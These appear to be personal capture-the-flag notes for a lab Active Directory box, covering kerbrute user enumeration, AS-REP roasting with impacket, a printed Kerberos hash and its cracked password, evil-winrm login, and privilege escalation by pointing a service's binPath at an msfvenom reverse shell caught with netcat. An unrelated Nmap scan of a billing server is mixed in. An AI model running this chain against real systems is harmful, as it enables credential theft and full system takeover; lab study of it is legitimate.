j.doe@services.local
#### Joanne Doe
#### Jack Rock
#### Will Masters
#### Johnny LaRusso

$krb5asrep$23$j.rock@SERVICES.LOCAL:4d57e9c723afbbf915fdb39460cf344f$15fe09284d717914859a2c11ac9d5a7e41f9f1cf37128ab9daf25de49796153718aa4457486c7ec207631043898e75e450bb09640db2e6b119a18320e76cd369cfe146ba74f329e32ae104a66a52daa27ffef1423137cb08d4ac8e310ebf0af74383e235b9fae4ed6c14af969dc37d098431a10110a3b717d629d46e5bb52212ee379ff229532872257e62982389ebe23c30f0b08b16fad9fa00a4bae06a8fe7976f019f4a6e9cda847d722bbbd212d489677232a958907ee4870d22f559088d8b6f610654d5e23cb5b37862e3eea5847324daebf3f2eabd65b77ddca210776c77c596726f8b3f5f80f7ba238b0ea70f

foudn valid usernames with kerbrute. found users from here <http://10.10.171.213/about.html>

kerbrute userenum generated_users.txt  --dc $target -d services.local

j.rock vulnerable to asreproast.
impacket-GetNPUsers services.local/ -dc-ip $target -usersfile generated_users.txt -outputfile hashes.txt

Cracked hash
Serviceworks1    ($krb5asrep$23$j.rock@SERVICES.LOCAL)     

evil-winrm -u j.rock -p Serviceworks1 -i $target

![unnamed_cab1fdf8896d4e32be845ef06f6db6f5](unnamed_cab1fdf8896d4e32be845ef06f6db6f5.png)
![unnamed_e906e950f35644baaca05e14bef8914a](unnamed_e906e950f35644baaca05e14bef8914a.png)
![unnamed_966079ac45c44682b0d6fac84e22f9f2](unnamed_966079ac45c44682b0d6fac84e22f9f2.png)
![unnamed_d3f054e7880e4c71974fad3d699fa578](unnamed_d3f054e7880e4c71974fad3d699fa578.png)

---
## Nmap
```
full

Nmap scan report for 10.10.231.33
Host is up (0.057s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
5038/tcp open  unknown


======
sVsC

Nmap scan report for 10.10.231.33
Host is up (0.056s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 33:82:51:0a:ce:58:19:c5:c4:ba:d7:c3:cd:cd:c7:70 (ECDSA)
|_  256 be:5c:dc:38:e1:31:2d:35:bb:0a:89:94:77:43:49:ca (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
| http-title:             MagnusBilling        
|_Requested resource was <http://10.10.231.33/mbilling/>
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
```
---
### Creds:
valud usernames:
2025/06/12 08:25:58 >  [+] VALID USERNAME:       j.doe@services.local
2025/06/12 08:25:58 >  [+] VALID USERNAME:       w.masters@services.local
2025/06/12 08:25:58 >  [+] VALID USERNAME:       j.rock@services.local
2025/06/12 08:25:58 >  [+] VALID USERNAME:       j.larusso@services.local

Serviceworks1    ($krb5asrep$23$j.rock@SERVICES.LOCAL)

---
##### Privesc:
We're in group Server Operaters. That allows us to run ‘services’ and manipulate the service executable associated with the service. If that service is running as localsystem, we will get a shell in that context. Just run ‘sc.exe qc service_name’ and if you see localsystem, you're good to go. 

##### Windows:
```
services
sc.exe config VMTools binPath="C:\Users\j.rock\Documents\shell.exe"
sc.exe stop VMTools
sc.exe start VMTools
```

##### Kali:
```
msfvenom -p windows/x64/shell/reverse_tcp lhost=tun0 lport=443 -f exe > shell.exe
nc -lvnp 443
```

Service running as system, so our new shell will be under that context. From here you can now dump hashes with mimikatz or netexec or whatever you want.